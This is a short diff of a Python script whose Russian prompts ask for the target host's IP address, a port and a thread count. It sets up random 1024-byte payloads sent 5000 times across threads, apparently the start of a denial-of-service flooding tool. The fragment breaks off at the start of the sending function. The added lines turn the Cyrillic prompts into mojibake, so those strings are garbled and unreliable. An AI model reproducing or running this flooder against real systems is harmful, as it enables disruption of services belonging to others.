@@ -1,13 +1,12 @@
-# -*- coding: cp1251 -*-
-import random
+п»їimport random
 import socket
 import threading
 
-ip = str(input('IP - адрес атакуемого хоста: '))
-port = str(input('Номер порта атакуемого хоста: '))
+ip = str(input('IP - Р°РґСЂРµСЃ Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
+port = str(input('РќРѕРјРµСЂ РїРѕСЂС‚Р° Р°С‚Р°РєСѓРµРјРѕРіРѕ С…РѕСЃС‚Р°: '))
 choice = 'y'
 times = 5000
-threads = int(input('Количество потоков: '))
+threads = int(input('РљРѕР»РёС‡РµСЃС‚РІРѕ РїРѕС‚РѕРєРѕРІ: '))
 
 def run(ip,port,times):
 	data = random._urandom(1024)
